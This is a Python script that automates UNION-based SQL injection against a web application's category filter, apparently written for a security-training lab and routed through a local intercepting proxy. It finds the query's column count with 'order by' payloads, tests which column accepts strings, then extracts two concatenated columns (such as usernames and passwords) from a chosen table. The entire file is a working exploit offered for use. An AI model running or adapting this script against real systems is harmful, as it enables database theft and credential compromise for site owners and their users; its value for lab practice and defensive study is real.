import sys
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes
BLUE = '\033[94m'
GREEN = '\033[92m'
GREEN_UNDERLINE = '\033[1;4;92m'
RED = '\033[91m'
BOLD = '\033[1m'
ENDC = '\033[0m'  # Reset color


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def cols_count(url, path):
	for i in range(1, 20):
		count_payload = "'+order+by+%s--" %i
		r = requests.get(url + path + count_payload, verify=False, proxies=proxies)
		res = r.text
		if "Internal Server Error" in res:
			return i - 1
		i += 1
	return False

def cols_hold_string(url, path, cols):
    total_cols = cols
    for i in range(total_cols):
        kosong = ['null'] * total_cols
        kosong[i] = "'a'"
        string_payload = "'+union+select+%s--" % ','.join(kosong)
        r = requests.get(url + path + string_payload, verify=False, proxies=proxies)
        res = r.text
        # print(res)
        if "Internal Server Error" not in res:
        	# return string_payload
        	return f'{GREEN}[+]{ENDC} This payload is successful: {GREEN_UNDERLINE}{BOLD}{url+path+string_payload}{ENDC}{ENDC}'
    return False

def retrieve_data(url, path, cols1, cols2, table, cols):
    data_retrieved = {}
    total_cols = cols
    for i in range(total_cols):
        kosong = ['null'] * total_cols
        kosong[i] = f"{cols1}+||+':'+||+{cols2}+from+{table}"
        string_payload = "'+union+select+%s--" % ','.join(kosong)
        r = requests.get(url + path + string_payload, verify=False, proxies=proxies)
        res = r.text
        # print(res)
        if "Internal Server Error" not in res:
            pattern = re.compile(r'^([a-zA-Z0-9]+:[a-zA-Z0-9]+)$', re.MULTILINE)
            matches = pattern.findall(res)
            for match in matches:
                key, value = match.split(':')
                data_retrieved[key] = value

            return f'{GREEN}[+]{ENDC} Data retrieved: {GREEN_UNDERLINE}{BOLD}{data_retrieved}{ENDC}{ENDC}'
    return False

    # return False

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		path = sys.argv[2].strip()
		cols1 = sys.argv[3].strip()
		cols2 = sys.argv[4].strip()
		table = sys.argv[5].strip()
	except IndexError:
		print('[-] Usage %s <url> <path>' % sys.argv[0])
		print('[-] Example: %s www.example.com /filter?category=office' % sys.argv[0])
		sys.exit(-1)

	print(f'{BLUE}[*]{ENDC} Trying to figure out total of columns...')
	num_columns = cols_count(url, path)
	if num_columns:
		print(f'{GREEN}[+]{ENDC} Total of columns in original query is {GREEN}{BOLD}{str(num_columns)}{ENDC}{ENDC}')
		print(f'{BLUE}[*]{ENDC} Starting to do "hold string" payload...')
		print(cols_hold_string(url, path, num_columns))
		# print(f'{GREEN}[+]{ENDC} This payload is successful: {GREEN_UNDERLINE}{BOLD}{retrieve_data()}{ENDC}{ENDC}')
		print(retrieve_data(url, path, cols1, cols2, table, num_columns))
	else:
		print(f'{RED}[-]{ENDC} Cannot determine the number of columns')
		print(f'{RED}[-]{ENDC} SQLI has failed')